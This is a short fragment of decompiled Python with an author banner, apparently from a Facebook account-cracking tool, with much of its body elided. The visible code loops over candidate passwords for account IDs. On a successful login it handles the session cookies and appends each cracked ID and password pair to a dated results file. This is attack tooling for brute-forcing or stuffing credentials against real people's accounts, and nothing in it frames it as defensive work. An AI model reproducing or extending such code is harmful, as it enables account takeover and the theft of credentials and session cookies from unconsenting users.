# Decompile by Kamran ali:)
# with (uncompyle6) version : 3.7.4
# Time Succes decompile : 2022-04-04 15:47:11.403269
...
def banner():
    print("\n%s    _________ __     \n%s   / ____/ (_) /____  ║ %sDesign By %sMrcute %s& %sALIRAZA\n%s  / __/ / / / __/ _ \ ║ %sFB %s: %sFacebook.com/abukalinkcopykarlia\n%s / /___/ / / /_/  __/ ║ %sFB %s: %sMOST WELCOME\n%s/_____/_/_/\__/\___/  ║ %sPakistan ZindaAbad"%(O,O,P,O,P,O,O,P,O,P,O,P,O,P,O,P,O,P))
def menu_log():
        ...
        try:
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    ...
                    h_ok = "\r%s[%sKAAMI-OK%s] %s • %s%s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id")),P)
                    cek_apk(h_ok,koki(log.get("cookies")))
                    self.ada.append("%s•%s"%(fl.get("id"),i))
                    open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
